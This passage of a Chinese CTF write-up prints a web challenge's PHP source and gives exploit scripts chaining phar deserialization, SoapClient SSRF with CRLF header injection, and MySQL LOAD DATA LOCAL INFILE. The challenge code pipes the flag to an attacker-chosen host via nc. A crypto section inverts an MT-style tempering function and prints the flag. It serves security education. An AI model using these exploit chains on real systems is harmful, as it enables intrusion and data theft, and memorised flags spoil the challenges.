variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag | nc $this->ip $this->port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ip</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$clazz</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'clazz'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$func1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'func1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$func2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'func2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$func3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'func3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arg1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'arg1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arg2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'arg2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arg2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'arg3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ad</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$clazz</span><span class="token punctuation">,</span> <span class="token variable">$func1</span><span class="token punctuation">,</span> <span class="token variable">$func2</span><span class="token punctuation">,</span> <span class="token variable">$func3</span><span class="token punctuation">,</span> <span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">,</span> <span class="token variable">$arg3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$admin</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"You r not admin!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关键点在admin.php，需要ssrf</p><p><code>finfo_file()</code>函数可以触发phar反序列化，而filename又可控，可以触发反序列化，利用SoapClient类来ssrf访问admin.php获取flag。</p><p>class.php过滤了许多协议使用 <code>php://filter/resource=phar://</code> 绕过，而 ssrf 则需要触发File的<code>__wakeup</code>方法，通过反射调用<code>check()</code>方法触发soap类的<code>__call</code>方法</p><p>admin.php的<code>Ad</code>类，触发<code>__desctruct</code>方法的话，确保<code>Ad::check</code>方法不报错就行。如果触发<code>__wakeup</code>方法的话，使用mysql的LOAD DATA LOCAL INFILE触发phar反序列化</p><p><a href="https://bugs.php.net/bug.php?id=77496" target="_blank" rel="noopener">mysqli-&gt;real_connect() overwrites MYSQLI_OPT_LOCAL_INFILE setting</a></p><pre class=" language-php"><code class="language-php"><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">mysqli_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_options</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token constant">MYSQLI_OPT_LOCAL_INFILE</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">mysqli_real_connect</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'mysql'</span><span class="token punctuation">,</span> <span class="token number">2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string">'select * from user;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> '<span class="token constant">LOAD</span> <span class="token constant">DATA</span> <span class="token constant">LOCAL</span> <span class="token constant">INFILE</span> \'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.png\' INTO TABLE class  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');</span></code></pre><h3 id="搭环境"><a href="#搭环境" class="headerlink" title="搭环境"></a>搭环境</h3><p>搭建docker环境后发现MariaDB在root使用unix_socket插件，使www用户无法登录mysql</p><pre><code>UPDATE user SET plugin=&quot;&quot;;FLUSH PRIVILEGES;</code></pre><p>要使用mysql的LOAD DATA LOCAL INFILE触发phar反序列化</p><p><a href="https://bugs.php.net/bug.php?id=77496" target="_blank" rel="noopener">mysqli-&gt;real_connect() overwrites MYSQLI_OPT_LOCAL_INFILE setting</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>先上传exp2生成的phar2文件，得到路径<br>再修改exp1中的phar://文件路径，生成phar1文件，上传<br>最后触发phar1的反序列化</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//exp1</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$type</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"SoapClient"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">newInstanceArgs</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/admin.php';</span>        <span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'admin=&amp;ip=xxip&amp;port=2333&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span><span class="token punctuation">;</span>        <span class="token variable">$post_string</span> <span class="token operator">=</span> 'admin<span class="token operator">=</span><span class="token operator">&amp;</span>ip<span class="token operator">=</span>ip<span class="token operator">&amp;</span>port<span class="token operator">=</span><span class="token number">2333</span><span class="token operator">&amp;</span>clazz<span class="token operator">=</span>Mysqli<span class="token operator">&amp;</span>func1<span class="token operator">=</span>init<span class="token operator">&amp;</span>func2<span class="token operator">=</span>real_connect<span class="token operator">&amp;</span>func3<span class="token operator">=</span>query<span class="token operator">&amp;</span>arg1<span class="token operator">=</span><span class="token operator">&amp;</span>arg2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>localhost<span class="token operator">&amp;</span>arg2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>root<span class="token operator">&amp;</span>arg2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>arg2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>mysql<span class="token operator">&amp;</span>arg2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3306</span><span class="token operator">&amp;</span>arg3<span class="token operator">=</span><span class="token constant">LOAD</span> <span class="token constant">DATA</span> <span class="token constant">LOCAL</span> <span class="token constant">INFILE</span> \'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/resource=phar://upload/0b4160b356e71f5df4c73233a8a686d9/b53bb7b00b61e16da81548d02884a78d.png\' INTO TABLE user  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;';</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"location"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">"user_agent"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"exp\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: profile=1"</span><span class="token punctuation">.</span><span class="token string">"\r\nContent-Length: "</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\r\n\r\n"</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">"uri"</span> <span class="token operator">=</span><span class="token operator">></span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/")];</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$exp</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;script language="php">__HALT_COMPILER();&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span><span class="token string">"phar.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//exp2</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Ad</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$exp</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Ad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;script language="php">__HALT_COMPILER();&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string">"phar2.phar"</span><span class="token punctuation">,</span><span class="token string">"phar2.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre><code>phar2文件上传的路径php://filter/resource=phar://upload/0b4160b356e71f5df4c73233a8a686d9/b53bb7b00b61e16da81548d02884a78d.png再上传phar1php://filter/resource=phar://upload/0b4160b356e71f5df4c73233a8a686d9/ed54ee58cd01e120e27939fe4a64fa92.png</code></pre><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="mt"><a href="#mt" class="headerlink" title="mt"></a>mt</h2><p>题目</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> random<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token keyword">def</span> <span class="token function">convert</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">>></span> <span class="token number">13</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">&lt;&lt;</span> <span class="token number">9</span> <span class="token operator">&amp;</span> <span class="token number">2029229568</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">&lt;&lt;</span> <span class="token number">17</span> <span class="token operator">&amp;</span> <span class="token number">2245263360</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">>></span> <span class="token number">19</span>    <span class="token keyword">return</span> m<span class="token keyword">def</span> <span class="token function">transform</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span>    new_message <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        block <span class="token operator">=</span> message<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">4</span> <span class="token punctuation">:</span> i <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>        block <span class="token operator">=</span> number<span class="token punctuation">.</span>bytes_to_long<span class="token punctuation">(</span>block<span class="token punctuation">)</span>        block <span class="token operator">=</span> convert<span class="token punctuation">(</span>block<span class="token punctuation">)</span>        block <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        new_message <span class="token operator">+=</span> block    <span class="token keyword">return</span> new_message<span class="token comment" spellcheck="true"># print len(flag[5:-1].decode('hex'))</span>transformed_flag <span class="token operator">=</span> transform<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'transformed_flag:'</span><span class="token punctuation">,</span> transformed_flag<span class="token comment" spellcheck="true"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></code></pre><p>自己的exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">def</span> <span class="token function">convert</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> <span class="token punctuation">(</span>m <span class="token operator">>></span> <span class="token number">13</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x78f39600</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">&lt;&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x85d40000</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> <span class="token punctuation">(</span>m <span class="token operator">>></span> <span class="token number">19</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token keyword">def</span> <span class="token function">dconvert</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">&amp;</span> <span class="token number">0xffffe000</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">>></span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>m <span class="token operator">&amp;</span> <span class="token number">0x1fff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    low17bit <span class="token operator">=</span> m <span class="token operator">&amp;</span> <span class="token number">0x1ffff</span>    low15bit <span class="token operator">=</span> m <span class="token operator">&amp;</span> <span class="token number">0x7fff</span>    high15bit <span class="token operator">=</span> <span class="token punctuation">(</span>low15bit<span class="token operator">&amp;</span><span class="token number">0x42ea</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">&amp;</span><span class="token number">0xfffe0000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">17</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span>high15bit<span class="token operator">&lt;&lt;</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token operator">|</span>low17bit    low9bit <span class="token operator">=</span> m <span class="token operator">&amp;</span> <span class="token number">0x1ff</span>    low9_18bit <span class="token operator">=</span> <span class="token punctuation">(</span>low9bit<span class="token operator">&amp;</span><span class="token number">0x1cb</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0x1ff</span><span class="token punctuation">)</span>    low18_27bit <span class="token operator">=</span> <span class="token punctuation">(</span>low9_18bit<span class="token operator">&amp;</span><span class="token number">0x3c</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0x1ff</span><span class="token punctuation">)</span>    high5bit <span class="token operator">=</span> <span class="token punctuation">(</span>low18_27bit<span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">27</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0x1f</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span>high5bit<span class="token operator">&lt;&lt;</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>low18_27bit<span class="token operator">&lt;&lt;</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>low9_18bit<span class="token operator">&lt;&lt;</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">|</span>low9bit    t <span class="token operator">=</span> m    m <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">&amp;</span> <span class="token number">0xfff80000</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">19</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>m<span class="token operator">&amp;</span><span class="token number">0x7ffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     m <span class="token operator">=</span> <span class="token punctuation">(</span>m<span class="token operator">&amp;</span><span class="token number">0xffffffc0</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>t<span class="token operator">&amp;</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> mflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x641460a9</span><span class="token punctuation">,</span><span class="token number">0xe3953b1a</span><span class="token punctuation">,</span><span class="token number">0xaa21f3a2</span><span class="token punctuation">]</span>message <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    block <span class="token operator">=</span> dconvert<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    block <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    message <span class="token operator">+=</span> block<span class="token keyword">print</span> message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>大佬的exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> random<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">def</span> <span class="token function">convert</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">>></span> <span class="token number">13</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">&lt;&lt;</span> <span class="token number">9</span> <span class="token operator">&amp;</span> <span class="token number">2029229568</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">&lt;&lt;</span> <span class="token number">17</span> <span class="token operator">&amp;</span> <span class="token number">2245263360</span>    m <span class="token operator">=</span> m <span class="token operator">^</span> m <span class="token operator">>></span> <span class="token number">19</span>    <span class="token keyword">return</span> m<span class="token keyword">def</span> <span class="token function">transform</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_message <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        block <span class="token operator">=</span> message<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">4</span> <span class="token punctuation">:</span> i <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>        block <span class="token operator">=</span> number<span class="token punctuation">.</span>bytes_to_long<span class="token punctuation">(</span>block<span class="token punctuation">)</span>        block <span class="token operator">=</span> convert<span class="token punctuation">(</span>block<span class="token punctuation">)</span>        block <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        new_message <span class="token operator">+=</span> block    <span class="token keyword">return</span> new_messagec1 <span class="token operator">=</span> <span class="token string">'641460a9'</span>c2 <span class="token operator">=</span> <span class="token string">'e3953b1a'</span>c3 <span class="token operator">=</span> <span class="token string">'aa21f3a2'</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span> x <span class="token operator">=</span> c <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>     xx <span class="token operator">=</span> x     x <span class="token operator">=</span> transform<span class="token punctuation">(</span>x<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> x <span class="token operator">==</span> c<span class="token punctuation">:</span>         <span class="token keyword">return</span> xx<span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">+</span>decode<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token operator">+</span>decode<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flag{84b45f89af22ce7e67275bdc}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> bypassDF </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> 伪静态文件 </tag>
            
